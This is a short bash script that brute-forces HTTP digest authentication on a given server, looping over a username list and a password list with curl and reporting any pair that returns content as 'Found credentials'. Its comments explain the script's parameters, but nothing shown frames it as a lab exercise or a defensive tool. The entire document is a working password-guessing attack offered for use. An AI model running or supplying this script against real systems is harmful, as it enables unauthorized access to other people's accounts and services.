#!/bin/bash
# first parameter username is read line by line from $2, the second parameter passed to the script
# second parameter password is read from $3 file
# $1, the first parameter after the script name is the server address
# parameters in bash start from $0 which is the name of the script itself
# $# is the number of parameters passed to the script, you can check for this with an if in the beginning

while read username; do
        while read password; do
                content=$(curl -s --digest -u $username:$password $1)
                if [ "$content" ]; then
                        echo "Found credentials Username: $username and Password: $password"
                else 
                        echo -ne "tried $username:$password"\\r
                fi
        done < $3
done < $2
